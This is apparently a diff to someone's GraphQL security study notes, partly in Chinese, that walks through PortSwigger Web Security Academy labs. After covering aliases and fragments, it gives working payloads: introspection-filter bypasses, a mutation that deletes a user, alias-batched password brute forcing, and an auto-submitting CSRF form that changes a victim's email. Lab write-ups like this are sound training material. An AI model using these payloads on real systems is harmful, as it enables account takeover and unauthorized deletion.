@@ -5,6 +5,105 @@ last_update:
   date: "2025-10-31T08:00:00+08:00"
 ---
 
+## How GraphQL works
+
+- queryType
+- mutationType
+- subscriptionType
+
+## Aliases
+
+Official Doc: https://graphql.org/learn/queries/#aliases
+PortSwigger Doc: https://portswigger.net/web-security/graphql/what-is-graphql#aliases
+
+Invalid query
+
+```js
+query getProductDetails {
+    getProduct(id: 1) {
+        id
+        name
+    }
+    getProduct(id: 2) {
+        id
+        name
+    }
+}
+```
+
+Valid query using aliases
+
+```js
+query getProductDetails {
+    product1: getProduct(id: "1") {
+        id
+        name
+    }
+    product2: getProduct(id: "2") {
+        id
+        name
+    }
+}
+```
+
+Response to query
+
+```json
+{
+  "data": {
+    "product1": {
+      "id": 1,
+      "name": "Juice Extractor"
+    },
+    "product2": {
+      "id": 2,
+      "name": "Fruit Overlays"
+    }
+  }
+}
+```
+
+## Fragments
+
+Official Doc: https://graphql.org/learn/queries/#fragments
+PortSwigger Doc: https://portswigger.net/web-security/graphql/what-is-graphql#fragments
+
+Example fragment
+
+```js
+fragment productInfo on Product {
+    id
+    name
+    listed
+}
+```
+
+Query calling the fragment
+
+```js
+query {
+    getProduct(id: 1) {
+        ...productInfo
+        stock
+    }
+}
+```
+
+Response including fragment fields
+
+```json
+{
+  "data": {
+    "getProduct": {
+      "id": 1,
+      "name": "Juice Extractor",
+      "listed": "no",
+      "stock": 5
+    }
+  }
+}
+```
+
 ## Universal queries
 
 https://portswigger.net/web-security/graphql#universal-queries
@@ -331,6 +430,545 @@ fetch(`${location.origin}/graphql/v1`, {
     }
   }
 }
+```
+
+## Bypassing GraphQL introspection defenses
+
+https://portswigger.net/web-security/graphql#bypassing-graphql-introspection-defenses
+
+如果 `{__schema{queryType{name}}}` 被擋住，可以嘗試
+
+1. space
+
+```
+{__schema {queryType{name}}}
+```
+
+2. new line
+
+```
+{__schema
+{queryType{name}}}
+```
+
+3. comma
+
+```
+{__schema,{queryType{name}}}
+```
+
+4. GET
+
+```
+GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+```
+
+## Lab: Finding a hidden GraphQL endpoint
+
+| Dimension | Description                                                                           |
+| --------- | ------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/graphql#bypassing-graphql-introspection-defenses |
+| Lab       | https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint            |
+
+瀏覽器訪問 `/api` => `"Query not present"`
+
+嘗試
+
+```js
+fetch(`${location.origin}/api?query={__schema{queryType{name}}}`);
+```
+
+回傳
+
+```json
+{
+  "errors": [
+    {
+      "locations": [],
+      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
+    }
+  ]
+}
+```
+
+嘗試 `\n`
+
+```js
+fetch(`${location.origin}/api?query={__schema%0A{queryType{name}}}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "name": "query"
+      }
+    }
+  }
+}
+```
+
+嘗試
+
+```js
+const query = `
+query {
+  __schema 
+  {
+    queryType {
+      fields {
+        name
+      }
+    }
+  }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "fields": [
+          {
+            "name": "getUser"
+          }
+        ]
+      }
+    }
+  }
+}
+```
+
+嘗試
+
+```js
+const query = `
+query {
+  __schema 
+  {
+    queryType {
+      fields {
+        name
+        args {
+          name
+          type {
+            name
+            kind
+            ofType {
+              name
+              kind
+            }
+          }
+        }
+        type {
+          name
+          kind
+          ofType {
+            name
+            kind
+            ofType {
+              name
+              kind
+            }
+          }
+          fields {
+            name
+            type {
+              name
+              kind
+            }
+          }
+        }
+      }
+    }
+  }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳（getUser 沒有 password 欄位）
+
+```json
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "fields": [
+          {
+            "name": "getUser",
+            "args": [
+              {
+                "name": "id",
+                "type": {
+                  "name": null,
+                  "kind": "NON_NULL",
+                  "ofType": {
+                    "name": "Int",
+                    "kind": "SCALAR"
+                  }
+                }
+              }
+            ],
+            "type": {
+              "name": "User",
+              "kind": "OBJECT",
+              "ofType": null,
+              "fields": [
+                {
+                  "name": "id",
+                  "type": {
+                    "name": null,
+                    "kind": "NON_NULL"
+                  }
+                },
+                {
+                  "name": "username",
+                  "type": {
+                    "name": null,
+                    "kind": "NON_NULL"
+                  }
+                }
+              ]
+            }
+          }
+        ]
+      }
+    }
+  }
+}
+```
+
+嘗試
+
+```js
+const query = `
+query {
+    getUser(id: 1) {
+        username
+        id
+    }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "getUser": {
+      "username": "administrator",
+      "id": 1
+    }
+  }
+}
+```
+
+嘗試轉 mutation
+
+```js
+const query = `
+query {
+  __schema 
+  {
+    mutationType {
+      fields {
+        name
+        args {
+          name
+          type {
+            name
+            kind
+            ofType {
+              name
+              kind
+            }
+          }
+        }
+        type {
+          name
+          kind
+          ofType {
+            name
+            kind
+            ofType {
+              name
+              kind
+            }
+          }
+          fields {
+            name
+            type {
+              name
+              kind
+            }
+          }
+        }
+      }
+    }
+  }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "__schema": {
+      "mutationType": {
+        "fields": [
+          {
+            "name": "deleteOrganizationUser",
+            "args": [
+              {
+                "name": "input",
+                "type": {
+                  "name": "DeleteOrganizationUserInput",
+                  "kind": "INPUT_OBJECT",
+                  "ofType": null
+                }
+              }
+            ],
+            "type": {
+              "name": "DeleteOrganizationUserResponse",
+              "kind": "OBJECT",
+              "ofType": null,
+              "fields": [
+                {
+                  "name": "user",
+                  "type": {
+                    "name": null,
+                    "kind": "NON_NULL"
+                  }
+                }
+              ]
+            }
+          }
+        ]
+      }
+    }
+  }
+}
+```
+
+查詢 DeleteOrganizationUserInput
+
+```js
+const query = `
+query {
+  __type
+  (name: "DeleteOrganizationUserInput") {
+    name
+    kind
+    inputFields {
+      name
+      type {
+        name
+        kind
+        ofType {
+          name
+          kind
+        }
+      }
+    }
+  }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "__type": {
+      "name": "DeleteOrganizationUserInput",
+      "kind": "INPUT_OBJECT",
+      "inputFields": [
+        {
+          "name": "id",
+          "type": {
+            "name": null,
+            "kind": "NON_NULL",
+            "ofType": {
+              "name": "Int",
+              "kind": "SCALAR"
+            }
+          }
+        }
+      ]
+    }
+  }
+}
+```
+
+畢竟是 PortSwigger，刷 Lab 刷到後來，大概也猜到帳號的排序，就是 `['administrator', 'wiener', 'carlos']`
+
+```js
+const query = `
+query {
+    getUser(id: 3) {
+        username
+    }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "getUser": {
+      "username": "carlos"
+    }
+  }
+}
+```
+
+來刪除使用者
+
+```js
+const query = `
+mutation {
+    deleteOrganizationUser(input: {
+        id: 3
+    }) {
+        user {
+            id
+            username
+        }
+    }
+}`;
+fetch(`${location.origin}/api?query=${encodeURIComponent(query)}`);
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "deleteOrganizationUser": {
+      "user": {
+        "id": 3,
+        "username": "carlos"
+      }
+    }
+  }
+}
+```
+
+graphql 的語法，我還在熟悉中，感覺很像是 JavaScript + JSON 的合體，另外對於 graphql 的物件模型，我也還在慢慢摸索
+
+## Lab: Bypassing GraphQL brute force protections
+
+| Dimension | Description                                                                            |
+| --------- | -------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/graphql#bypassing-rate-limiting-using-aliases     |
+| Lab       | https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass |
+
+嘗試
+
+```js
+const query = `
+mutation {
+${passwords
+  .map(
+    (
+      password,
+    ) => `password${password}: login(input: { username: "carlos", password: "${password}" }) {
+    token
+    success
+}`,
+  )
+  .join("\n")}
+}`;
+fetch(`${location.origin}/graphql/v1`, {
+  headers: {
+    "content-type": "application/json",
+  },
+  body: JSON.stringify({
+    query: query,
+  }),
+  method: "POST",
+  mode: "cors",
+  credentials: "include",
+});
+```
+
+回傳
+
+```json
+{
+  "data": {
+    "password112233": {
+      "token": "g8vi50PE6qsp2IvBrHlIdzmqZqe2tdEp",
+      "success": true
+    }
+  }
+}
+```
+
+用 `carlos:112233` 登入即可成功解題～
+
+## Lab: Performing CSRF exploits over GraphQL
+
+| Dimension | Description                                                                   |
+| --------- | ----------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/graphql#graphql-csrf                     |
+| Lab       | https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api |
+
+嘗試以下，可成功修改 email
+
+```js
+const query = `
+mutation {
+    changeEmail(input: { email: "123@456" }) {
+        email
+    }
+}`;
+fetch(
+  "https://0aea00d403936815809249e50054008d.web-security-academy.net/graphql/v1",
+  {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
+    },
+    body: `query=${encodeURIComponent(query)}`,
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+在 exploit-server 構造
+
+```html
+<form
+  action="https://0aea00d403936815809249e50054008d.web-security-academy.net/graphql/v1"
+  method="POST"
+>
+  <input name="query" id="query" />
+</form>
+<script>
+  const query = `
+mutation {
+    changeEmail(input: { email: "456@789" }) {
+        email
+    }
+}`;
+  document.getElementById("query").value = query;
+  document.forms[0].submit();
+</script>
 ```
 
 ## 參考資料
